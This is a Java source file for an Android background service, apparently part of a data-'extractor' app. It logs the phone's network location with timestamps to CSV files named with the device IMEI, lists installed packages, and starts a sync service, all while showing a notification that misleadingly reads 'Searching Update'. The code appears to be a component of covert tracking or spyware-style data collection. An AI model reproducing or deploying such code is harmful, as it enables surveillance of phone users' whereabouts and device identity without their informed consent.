package info.kalagato.com.extractor.readers;


import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import info.kalagato.com.extractor.Constant;
import info.kalagato.com.extractor.Extractor;
import info.kalagato.com.extractor.SyncService;
import info.kalagato.com.extractor.Util;

public class LocationReader extends Service {

    private String TAG = "read-sms-service";
    private Looper mServiceLooper;
    private ServiceHandler mServiceHandler;

    @Override
    public void onCreate() {
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        HandlerThread thread = new HandlerThread("Location_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND);
        thread.start();

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.getLooper();
        mServiceHandler = new ServiceHandler(mServiceLooper);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Intent notificationIntent = new Intent(getApplicationContext(), Extractor.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(),
                0, notificationIntent, 0);

        Notification notification = new NotificationCompat.Builder(getApplicationContext(), Constant.CHANNEL_ID) //todo fix hardcoded channel id
                .setSmallIcon(info.kalagato.com.extractor.R.drawable.ic_settings)
                .setContentTitle("Searching Update")
                .setContentText("")
                .setShowWhen(false)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);

        try {
            // For each start request, send a message to start a job and deliver the
            // start ID so we know which request we're stopping when we finish the job
            Message msg = mServiceHandler.obtainMessage();
            msg.arg1 = startId;
            // Create a bundle with the data
            Bundle bundle = new Bundle();

            // Set the bundle data to the Message
            msg.setData(bundle);
            mServiceHandler.sendMessage(msg);
        }
        catch (Exception e){
        }

        //do heavy work on a background thread
        //stopSelf();

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        stopForeground(true);
        super.onDestroy();
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    // Handler to run on a thread to work in background
    private final class ServiceHandler extends Handler {

        public ServiceHandler(Looper looper) {
            super(looper);
        }

        @Override
        public void handleMessage(Message msg) {

            location(getApplicationContext(),msg);

            new AppRunningStatus().getAllPackageInstalled(getApplicationContext());

            //checking sync
            Intent serviceIntent = new Intent(getApplicationContext(), SyncService.class);
            ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
            // Stop the service using the startId, so that we don't stop
            // the service in the middle of handling another job

        }

        public void location(final Context context, final Message msg){
            try {

                LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

                LocationListener locationListener = new LocationListener() {
                    public void onLocationChanged(Location location) {
                        // Called when a new location is found by the network location provider.
                        try {
                            File folder = new File(Environment.getExternalStorageDirectory()
                                    + "/Folder");

                            boolean var = false;
                            if (!folder.exists())
                                var = folder.mkdir();

                            Date c = Calendar.getInstance().getTime();
                            SimpleDateFormat df = new SimpleDateFormat("dd-MMM-yyyy");
                            String formattedDate = df.format(c);

                            String filename = folder.toString() + "/" + Constant.LOCATION + "_"
                                    + Util.getIMEI(context) + "_" + formattedDate + ".csv";

                            FileWriter fw = new FileWriter(filename,true);
                            fw.append("" + c.getTime());
                            fw.append(",");
                            fw.append("" + location.getLongitude());
                            fw.append(",");
                            fw.append("" + location.getLatitude());
                            fw.append(",");
                            fw.append("" + location.getAccuracy());
                            fw.append(",");
                            fw.append('\n');

                            fw.flush();
                            fw.close();
                            stopSelf(msg.arg1);
                        }
                        catch (Exception e){
                            e.printStackTrace();
                        }

                    }

                    public void onStatusChanged(String provider, int status, Bundle extras) {
                    }

                    public void onProviderEnabled(String provider) {
                    }

                    public void onProviderDisabled(String provider) {
                    }
                };

                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED
                        && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    return;
                }
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);


            } catch (Exception e) { }
        }
    }
}
